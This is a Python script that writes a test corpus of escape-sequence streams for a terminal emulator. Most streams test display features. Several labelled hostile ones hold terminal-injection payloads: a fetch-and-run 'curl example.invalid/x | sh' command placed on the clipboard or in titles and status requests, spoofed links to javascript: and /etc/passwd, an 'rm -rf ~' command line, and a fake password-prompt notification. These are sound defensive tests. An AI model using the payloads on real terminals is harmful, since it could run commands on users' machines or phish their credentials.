"""Writes the authored corpus recordings: `input.bin` and `script.toml` for each.

These streams are authored here, not captured from real programs: what a recording holds
is then known line by line, and nothing of the machine it was made on ends up in it.
The first group exercises what a terminal shows. The second holds what programs ask a
terminal and what they switch on in it. The third is hostile: streams that try to make
the terminal say something back, run away with memory, or misbehave at its limits.

Run from the repository root:

    python -I tests/corpus/make_synthetic.py

Then regenerate the goldens and read them before keeping them:

    UPDATE_GOLDEN=1 cargo test -p lume-vt --test corpus
"""

from pathlib import Path

ROOT = Path(__file__).resolve().parent
ESC = "\x1b"
CSI = ESC + "["
OSC = ESC + "]"
DCS = ESC + "P"
APC = ESC + "_"
ST = ESC + "\\"
BEL = "\x07"


def write(name: str, description: str, cols: int, rows: int, data, resizes=()):
    """`data` is text, or bytes for a stream that is not valid UTF-8. `resizes` is a list
    of (byte_offset, cols, rows)."""
    directory = ROOT / name
    directory.mkdir(exist_ok=True)
    payload = data if isinstance(data, bytes) else data.encode("utf-8")
    (directory / "input.bin").write_bytes(payload)
    lines = [
        f'description = "{description}"',
        f"cols = {cols}",
        f"rows = {rows}",
    ]
    for at, c, r in resizes:
        lines += ["", "[[resize]]", f"at = {at}", f"cols = {c}", f"rows = {r}"]
    (directory / "script.toml").write_text("\n".join(lines) + "\n", encoding="utf-8", newline="\n")
    print(f"{name}: {len(payload)} bytes")


def plain_shell() -> str:
    out = []
    prompt = "user@host:~$ "
    # Enough output to scroll the 24-row screen. It comes first so that the cases after it
    # are still on screen when the dump is taken.
    out.append(prompt + "seq 1 30\r\n")
    for i in range(1, 31):
        out.append(f"{i}\r\n")
    out.append(prompt + "echo hello\r\nhello\r\n")
    # A typo corrected with backspace: the terminal sees BS, space, BS.
    out.append(prompt + "ls -lx" + "\b \b" + "a\r\n")
    out.append("total 12\r\n")
    for name in ["Cargo.toml", "README.md", "src"]:
        out.append(f"-rw-r--r--  1 user user  512 Nov 14 01:00 {name}\r\n")
    # Tabs advance to the next multiple of eight.
    out.append(prompt + "printf 'a\\tb\\tc\\n'\r\n")
    out.append("a\tb\tc\r\n")
    # A line longer than the screen is wide soft-wraps.
    out.append(prompt + "echo " + "w" * 90 + "\r\n")
    out.append("w" * 90 + "\r\n")
    # Carriage return alone returns to column 0 and overwrites.
    out.append("progress 10%\rprogress 100%\r\n")
    out.append(prompt)
    return "".join(out)


def colors_and_attributes() -> str:
    out = []
    sgr = lambda *codes: CSI + ";".join(str(c) for c in codes) + "m"
    reset = sgr(0)
    out.append("normal " + sgr(1) + "bold" + reset + " " + sgr(2) + "faint" + reset + " ")
    out.append(sgr(3) + "italic" + reset + " " + sgr(7) + "inverse" + reset + " ")
    out.append(sgr(9) + "strike" + reset + "\r\n")
    out.append(sgr(4) + "underline" + reset + " " + CSI + "4:3m" + "curly" + reset + " ")
    out.append(sgr(21) + "double" + reset + "\r\n")
    # The eight standard foreground colours, then the eight bright ones.
    out.append("".join(sgr(30 + i) + "X" for i in range(8)) + reset + " ")
    out.append("".join(sgr(90 + i) + "X" for i in range(8)) + reset + "\r\n")
    # Background colours.
    out.append("".join(sgr(40 + i) + " " for i in range(8)) + reset + "\r\n")
    # 256-colour and direct colour, foreground and background.
    out.append(sgr(38, 5, 208) + "orange208" + reset + " " + sgr(48, 5, 27) + "blue27" + reset + "\r\n")
    out.append(sgr(38, 2, 255, 128, 0) + "rgb-fg" + reset + " ")
    out.append(sgr(48, 2, 16, 32, 64) + "rgb-bg" + reset + "\r\n")
    # Attributes combine, and a partial reset keeps the rest.
    out.append(sgr(1, 3, 31) + "bold-italic-red" + sgr(22) + " italic-red" + sgr(23, 39) + " plain\r\n")
    # A style carried across a newline, then reset.
    out.append(sgr(32) + "green starts here\r\nand continues" + reset + " until reset\r\n")
    return "".join(out)


def wide_and_emoji() -> str:
    out = []
    out.append("ascii then 中文 then ascii\r\n")  # CJK, two columns each
    out.append("日本語のテキスト\r\n")
    out.append("emoji: \U0001f600 \U0001f680 done\r\n")  # single-codepoint emoji
    out.append("zwj: \U0001f468‍\U0001f469‍\U0001f467 end\r\n")  # family, joined
    out.append("flag: \U0001f1ef\U0001f1f5 end\r\n")  # regional indicators
    out.append("combining: é ä ô end\r\n")  # base plus combining mark
    out.append("vs16: ❤️ end\r\n")  # heart with emoji presentation selector
    # A wide character that does not fit in the last column wraps whole.
    out.append("x" * 39 + "中" + "tail\r\n")
    out.append("half-width kana: ｶﾞｷﾞ end\r\n")
    return "".join(out)


def alternate_screen() -> str:
    out = []
    goto = lambda row, col: f"{CSI}{row};{col}H"
    out.append("before the full-screen program\r\n$ editor file.txt\r\n")
    out.append(CSI + "?1049h")  # enter the alternate screen, saving the cursor
    out.append(CSI + "2J" + CSI + "H")
    # A title bar in inverse video across the full width.
    out.append(CSI + "7m" + " file.txt".ljust(40) + CSI + "0m")
    # A box drawn with cursor addressing.
    out.append(goto(3, 5) + "┌" + "─" * 20 + "┐")
    for row in range(4, 8):
        out.append(goto(row, 5) + "│" + goto(row, 26) + "│")
    out.append(goto(8, 5) + "└" + "─" * 20 + "┘")
    out.append(goto(5, 7) + CSI + "1m" + "Hello, editor" + CSI + "0m")
    # A scroll region on rows 10 to 14, scrolled by writing six lines into it.
    out.append(CSI + "10;14r" + goto(10, 1))
    for i in range(1, 7):
        out.append(f"region line {i}\r\n")
    out.append(CSI + "r")  # reset the scroll region
    # Erase to end of line, and insert and delete characters.
    out.append(goto(16, 1) + "erase-from-here>>>>>>>>" + goto(16, 16) + CSI + "K")
    out.append(goto(17, 1) + "abcdef" + goto(17, 3) + CSI + "2@" + goto(18, 1) + "abcdef" + goto(18, 3) + CSI + "2P")
    # A status line on the last row, then park the cursor and hide it.
    out.append(goto(20, 1) + CSI + "7m" + "-- INSERT --".ljust(40) + CSI + "0m")
    out.append(goto(5, 20) + CSI + "?25l")
    return "".join(out)


def resize_and_reflow():
    first = "The quick brown fox jumps over the lazy dog. " * 3 + "\r\n" + "short line\r\n"
    second = "after narrowing: " + "n" * 30 + "\r\n"
    third = "after widening\r\n"
    data = first + second + third
    at_narrow = len(first.encode("utf-8"))
    at_wide = at_narrow + len(second.encode("utf-8"))
    return data, [(at_narrow, 20, 12), (at_wide, 60, 12)]


def goto(row: int, col: int) -> str:
    return f"{CSI}{row};{col}H"


def scroll_regions() -> str:
    out = []
    for i in range(1, 17):
        out.append(goto(i, 1) + f"line {i:02}")
    # A region on rows 4 to 10. A line feed on its last row scrolls the region only.
    out.append(CSI + "4;10r" + goto(10, 1) + "\n\n" + "fed at the bottom")
    # Reverse index on its first row scrolls it the other way.
    out.append(goto(4, 1) + ESC + "M" + ESC + "M" + "reversed at the top")
    # Scroll up by two and down by one, without moving the cursor.
    out.append(CSI + "2S" + CSI + "1T")
    # Insert two lines and delete one, inside the region.
    out.append(goto(6, 1) + CSI + "2L" + "inserted" + goto(8, 1) + CSI + "1M")
    # With origin mode, row 1 is the region's first row.
    out.append(CSI + "?6h" + goto(1, 20) + "origin" + CSI + "?6l")
    out.append(CSI + "r")
    # Left and right margins: text wraps between columns 10 and 30.
    out.append(CSI + "?69h" + CSI + "10;30s" + goto(12, 10))
    out.append("text that wraps between the two margins it was given")
    out.append(CSI + "?69l" + goto(16, 1))
    return "".join(out)


def input_modes() -> str:
    out = []
    out.append("modes a full-screen program turns on\r\n")
    # Application cursor keys and keypad, mouse reporting in SGR form, focus events,
    # bracketed paste and alternate scroll.
    out.append(CSI + "?1h" + ESC + "=")
    out.append(CSI + "?1000h" + CSI + "?1002h" + CSI + "?1006h")
    out.append(CSI + "?1004h" + CSI + "?2004h" + CSI + "?1007h")
    # Is bracketed paste on? Is mouse reporting? Is any-event reporting, which was not set?
    out.append(CSI + "?2004$p" + CSI + "?1000$p" + CSI + "?1003$p")
    # The keyboard protocol: push flags, then ask which are in force.
    out.append(CSI + ">5u" + CSI + "?u")
    # Insert mode is an ANSI mode; ask for it by its ANSI number.
    out.append(CSI + "4h" + CSI + "4$p")
    out.append("abc" + goto(2, 1) + "X")
    out.append(CSI + "4l")
    # Some are turned off again; the keyboard flags are popped.
    out.append(CSI + "?1002l" + CSI + "?1007l" + CSI + "<u" + CSI + "?u")
    # A bar cursor that does not blink.
    out.append(CSI + "6 q" + goto(4, 1) + "left as the program left it")
    return "".join(out)


def synchronized_output() -> str:
    out = []
    out.append("frame 0\r\n")
    # A frame drawn between the two marks is shown whole.
    out.append(CSI + "?2026h")
    out.append(CSI + "?2026$p")
    out.append(CSI + "2J" + goto(1, 1) + "frame 1, line 1" + goto(2, 1) + "frame 1, line 2")
    out.append(CSI + "?2026l")
    out.append(CSI + "?2026$p")
    # A second frame over the first.
    out.append(CSI + "?2026h" + goto(1, 7) + "2" + goto(2, 7) + "2" + goto(3, 1) + "done")
    out.append(CSI + "?2026l")
    return "".join(out)


def shell_integration() -> str:
    out = []
    prompt = "user@host:~/project$ "
    out.append(OSC + "7;file://host/home/user/project" + ST)
    out.append(OSC + "2;user@host: ~/project" + ST)
    # A prompt, the command typed at it, its output, and its end with a status.
    out.append(OSC + "133;A" + ST + prompt + OSC + "133;B" + ST + "make test\r\n")
    out.append(OSC + "133;C" + ST + "running 3 tests\r\nok\r\n" + OSC + "133;D;0" + ST)
    # What the program says it is doing, while it does it.
    out.append(OSC + "7501;state=working:app=make:msg=YnVpbGRpbmc=" + ST)
    out.append(OSC + "133;A" + ST + prompt + OSC + "133;B" + ST + "false\r\n")
    out.append(OSC + "133;C" + ST + OSC + "133;D;1" + ST)
    out.append(OSC + "7501;state=done:app=make" + ST)
    # The same marks ended with BEL, as older shells send them.
    out.append(OSC + "7;file://host/tmp" + BEL + OSC + "133;A" + BEL + prompt)
    # Asking what statuses are understood is answered only by a terminal that shows them.
    out.append(OSC + "7501;?" + ST)
    return "".join(out)


def full_screen_program() -> str:
    out = []
    out.append("$ editor notes.txt\r\n")
    # Start-up: the alternate screen, the title kept for later, the keys and the mouse.
    out.append(CSI + "?1049h" + CSI + "22;0;0t" + CSI + "?1h" + ESC + "=")
    out.append(CSI + "?2004h" + CSI + "?1000h" + CSI + "?1006h")
    # What it asks before it draws: what the terminal is, the background colour, the
    # keyboard protocol, where the cursor is, and the cursor's style.
    out.append(CSI + ">c" + CSI + "c" + OSC + "11;?" + BEL + CSI + "?u" + CSI + "6n")
    out.append(DCS + "$q q" + ST)
    out.append(OSC + "2;notes.txt - editor" + ST)
    out.append(CSI + "2J" + CSI + "H")
    text = [
        "# Notes",
        "",
        "- the first thing",
        "- the second thing, which is long enough to say something",
        "- a third",
    ]
    for number, line in enumerate(text, 1):
        out.append(goto(number, 1) + CSI + "38;5;243m" + f"{number:3} " + CSI + "0m" + line)
    for row in range(len(text) + 1, 23):
        out.append(goto(row, 1) + CSI + "34m~" + CSI + "0m")
    out.append(goto(23, 1) + CSI + "7m" + " notes.txt [+]".ljust(60) + "5,3   All ".rjust(20) + CSI + "0m")
    out.append(goto(24, 1) + "-- INSERT --")
    # The text scrolls by one line inside the rows above the status line.
    out.append(CSI + "1;22r" + goto(22, 1) + "\n" + CSI + "r")
    out.append(goto(22, 1) + CSI + "38;5;243m" + "  6 " + CSI + "0m" + "- a line that scrolled in")
    # A bar cursor while inserting, left on the text.
    out.append(CSI + "6 q" + goto(4, 10))
    return "".join(out)


def queries() -> str:
    out = []
    out.append("questions a program asks its terminal\r\n")
    # Who are you: answerback, the three device attributes, the name and version.
    out.append("\x05" + CSI + "c" + CSI + ">c" + CSI + "=c" + CSI + ">q")
    # Are you well, where is the cursor, and where with the page.
    out.append(CSI + "5n" + goto(2, 5) + CSI + "6n" + CSI + "?6n")
    # How large is the text area, in cells and in pixels, and how large is a cell.
    out.append(CSI + "18t" + CSI + "14t" + CSI + "16t" + CSI + "19t")
    # Is the user's colour scheme dark or light.
    out.append(CSI + "?996n")
    # What colour is the text, the background, the cursor, and palette entry 1.
    out.append(OSC + "10;?" + ST + OSC + "11;?" + ST + OSC + "12;?" + ST + OSC + "4;1;?" + ST)
    # What are the graphic rendition, the scroll region and the conformance level set to.
    out.append(CSI + "1;31m" + DCS + "$qm" + ST + CSI + "0m")
    out.append(CSI + "3;9r" + DCS + "$qr" + ST + CSI + "r")
    out.append(DCS + '$q"p' + ST)
    # What does the terminal description call this terminal ("TN").
    out.append(DCS + "+q544e" + ST)
    # A mode nobody has heard of.
    out.append(CSI + "?9999$p")
    out.append(goto(3, 1) + "and the answers went to the program, not the screen")
    return "".join(out)


def hostile_clipboard() -> str:
    out = []
    out.append("a program that goes for the clipboard\r\n")
    # Asking to read the clipboard, the selection, and both.
    out.append(OSC + "52;c;?" + BEL + OSC + "52;p;?" + ST + OSC + "52;cp;?" + ST)
    # Putting a command on it: base64 of "curl example.invalid/x | sh" and a newline.
    out.append(OSC + "52;c;Y3VybCBleGFtcGxlLmludmFsaWQveCB8IHNoCg==" + BEL)
    # The same with text that is not base64, and with nothing.
    out.append(OSC + "52;c;not base64 at all!" + ST + OSC + "52;c;" + ST)
    # The newer protocol's read.
    out.append(OSC + "5522;type=read:mime=dGV4dC9wbGFpbg==" + ST)
    out.append("nothing was answered and nothing is shown of it\r\n")
    return "".join(out)


def hostile_title() -> str:
    out = []
    out.append("a program that tries to have its own words typed back at it\r\n")
    # A title that would be a command if it came back as input.
    out.append(OSC + "2;\"; curl example.invalid/x | sh #" + BEL)
    # Report the title, the icon label, and the title again after putting it on the stack.
    out.append(CSI + "21t" + CSI + "20t" + CSI + "22;0;0t" + CSI + "23;0;0t" + CSI + "21t")
    # A status request that carries a command instead of a setting.
    out.append(DCS + "$q; curl example.invalid/x | sh\r" + ST)
    # The font, which some terminals report with what was set.
    out.append(OSC + "50;?" + BEL)
    # A colour set to a string, then asked for.
    out.append(OSC + "10;; curl example.invalid/x | sh" + BEL + OSC + "10;?" + BEL)
    out.append("whatever was answered holds none of it\r\n")
    return "".join(out)


def hostile_links() -> str:
    out = []
    link = lambda target, text: OSC + "8;;" + target + ST + text + OSC + "8;;" + ST
    out.append("links that are not what they seem\r\n")
    out.append(link("javascript:alert(1)", "an ordinary link") + "\r\n")
    out.append(link("file:///etc/passwd", "https://example.com/safe") + "\r\n")
    out.append(link("data:text/html,<script>alert(1)</script>", "click here") + "\r\n")
    out.append(link("https://example.com/" + "a" * 3000, "a very long address") + "\r\n")
    # With an id, and one that is never closed.
    out.append(OSC + "8;id=x;https://example.com/one" + ST + "opened with an id" + OSC + "8;;" + ST + "\r\n")
    out.append(OSC + "8;;https://example.com/unclosed" + ST + "never closed\r\nand still going\r\n")
    return "".join(out)


def hostile_limits() -> bytes:
    out = []
    out.append("a program that pushes at every limit\r\n")
    # A title far longer than any window shows.
    out.append(OSC + "2;" + "A" * 5000 + BEL)
    # The cursor sent far outside the screen, each way.
    out.append(goto(99999, 99999) + "E" + CSI + "99999A" + CSI + "99999D" + "S")
    # One character repeated more often than the screen has cells.
    out.append(goto(3, 1) + "r" + CSI + "99999b")
    # A rendition with hundreds of parameters, and one with a number past any limit.
    out.append(goto(2, 1) + CSI + ";".join(["1"] * 300) + "m" + "bold" + CSI + "0m")
    out.append(CSI + "99999999999999999999m" + CSI + "38;2;999;999;999m" + "colour" + CSI + "0m")
    # Inserting and deleting more than there is.
    out.append(goto(4, 1) + "keep" + CSI + "99999@" + CSI + "99999P" + CSI + "99999L" + CSI + "99999M")
    # A scroll region that makes no sense.
    out.append(CSI + "0;99999r" + CSI + "9;2r" + CSI + "r")
    # Asking the window to become enormous, to move, and to go away.
    out.append(CSI + "8;9999;9999t" + CSI + "3;0;0t" + CSI + "2t")
    # A picture by each protocol, which this terminal does not draw.
    out.append(APC + "Ga=T,f=24,s=1,v=1;AAAA" + ST)
    out.append(DCS + "q#0;2;0;0;0#0~~@@vv@@~~@@~~$" + ST)
    # A notification, by each of the two sequences for it.
    out.append(OSC + "9;your session has expired, type your password" + BEL)
    out.append(OSC + "777;notify;Update;run this command" + ST)
    # A string that is never ended swallows what follows until something ends it.
    out.append(goto(5, 1) + DCS + "never ended " + "x" * 200 + "\x18" + "after the cancel")
    payload = "".join(out).encode("utf-8")
    # Bytes that are not UTF-8, a control from the upper range, and a NUL.
    payload += goto(6, 1).encode() + b"bad:\xff\xfe\xc3(\xe2\x82 \x9b31mC1 \x00nul"
    payload += (goto(7, 1) + "and the terminal is still standing").encode()
    return payload


def full_reset() -> str:
    out = []
    # Everything a program can leave behind: a title, a directory, modes, the alternate
    # screen, a scroll region, colours, a cursor style.
    out.append(OSC + "2;left behind" + ST + OSC + "7;file://host/left/behind" + ST)
    out.append(CSI + "?1049h" + CSI + "?1000h" + CSI + "?2004h" + CSI + "4h" + CSI + "?25l")
    out.append(CSI + "3;5r" + CSI + "1;31;44m" + CSI + "6 q" + "left on the alternate screen")
    # A full reset takes all of it away.
    out.append(ESC + "c" + "after the reset")
    return "".join(out)


def scroll_flood() -> str:
    # Far more lines than the screen has rows: everything but the last few scrolls away.
    return "".join(f"{i:05}\r\n" for i in range(1, 5001)) + "end"


def base64_text(text: str) -> str:
    import base64

    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def hostile_reports() -> str:
    """What a shell reports about itself, said by output that is no shell's: a file that
    was printed, or a program on another machine."""
    out = []
    out.append("$ cat notes-from-somewhere.txt\r\n")
    # A directory on another machine, one that claims to be this machine's, one that
    # hides a line break and the start of a title in its escapes, and one that is no
    # directory.
    out.append(OSC + "7;file://elsewhere/etc" + ST)
    out.append(OSC + "7;file://localhost/" + ST)
    out.append(OSC + "7;file://localhost/tmp/%0a%1b%5d2;taken" + BEL)
    out.append(OSC + "7;javascript:alert(1)" + ST)
    # A command nobody ran, whose line carries a line break and a control sequence, its
    # end, and an end with no beginning and a status no command returns.
    out.append(OSC + "133;C;cmdline_url=rm%20-rf%20~%0a%1b%5b2J" + ST)
    out.append(OSC + "133;D;0" + ST)
    out.append(OSC + "133;D;-999999999999" + ST)
    # A status that asks for a password, which is only ever shown; then statuses that
    # break a rule each: text that is not base64, text with a line break in it, a
    # record's path that is a path of files, a name too long, a report too long.
    out.append(OSC + "7501;state=blocked:kind=auth:app=sudo:msg=" + base64_text("Password:") + ST)
    out.append(OSC + "7501;state=error:msg=!!!" + ST)
    out.append(OSC + "7501;state=working:msg=" + base64_text("one\ntwo") + ST)
    out.append(OSC + "7501;state=working:id=/etc/passwd" + ST)
    out.append(OSC + "7501;state=done:app=" + "a" * 40 + ST)
    out.append(OSC + "7501;state=idle:msg=" + "QUFB" * 1200 + ST)
    # A directory too long to be one, and a report longer than anything is kept for.
    out.append(OSC + "7;file://localhost/" + "d" * 3000 + ST)
    out.append(OSC + "7501;state=idle:app=" + "x" * 20000 + ST)
    # Asking what is understood gets no answer that could be read as typing.
    out.append(OSC + "7501;?" + ST)
    out.append("done\r\n$ ")
    return "".join(out)


def main():
    write("01-plain-shell", "A shell session: prompts, backspace, tabs, scrolling, soft wrap, carriage return", 80, 24, plain_shell())
    write("02-colors-attributes", "SGR colours and attributes: 16, 256 and direct colour, bold, italic, underline styles", 80, 24, colors_and_attributes())
    write("03-wide-emoji", "Wide characters, emoji, joined sequences, combining marks, wide wrap at the margin", 40, 12, wide_and_emoji())
    write("04-alternate-screen", "A full-screen program: alternate screen, cursor addressing, scroll region, erase, insert and delete", 40, 20, alternate_screen())
    data, resizes = resize_and_reflow()
    write("05-resize-reflow", "Soft-wrapped text reflowed by narrowing and then widening the grid", 40, 12, data, resizes)
    write("06-scroll-regions", "Scroll regions: line feed and reverse index at the margins, scrolling, insert and delete lines, origin mode, left and right margins", 40, 16, scroll_regions())
    write("07-input-modes", "Modes for the keyboard and the mouse, set, asked for and reset: cursor keys, mouse reporting, focus, bracketed paste, the keyboard protocol, insert", 60, 8, input_modes())
    write("08-synchronized-output", "Frames drawn between the synchronized-output marks, and the mode asked for inside and outside them", 40, 6, synchronized_output())
    write("09-shell-integration", "What a shell reports about itself: the working directory, the title, prompt and command marks, program status", 60, 10, shell_integration())
    write("10-full-screen-program", "An editor starting up: the alternate screen, its questions, the mouse and the keys, a scrolling text area and a status line", 80, 24, full_screen_program())
    write("11-queries", "Questions a program asks its terminal, each answered once: identity, cursor, size, colours, settings", 80, 6, queries())
    write("12-hostile-clipboard", "Hostile: reading the clipboard and putting a command on it", 60, 6, hostile_clipboard())
    write("13-hostile-title", "Hostile: a title, a status request and a colour that would be commands if the terminal sent them back", 70, 6, hostile_title())
    write("14-hostile-links", "Hostile: links whose target is a script, a local file, or not what the text says", 60, 10, hostile_links())
    write("15-hostile-limits", "Hostile: an oversized title, numbers past every limit, pictures, notifications, an unended string, bytes that are not UTF-8", 40, 8, hostile_limits())
    write("16-scroll-flood", "Five thousand lines through a six-row screen", 20, 6, scroll_flood())
    write("17-full-reset", "A full reset after a program left a title, a directory, modes, the alternate screen and colours behind", 40, 6, full_reset())
    write("18-hostile-reports", "Hostile: what a shell reports about itself, said by output that is no shell's: directories of other machines, commands nobody ran, statuses that break the rules", 60, 6, hostile_reports())


if __name__ == "__main__":
    main()
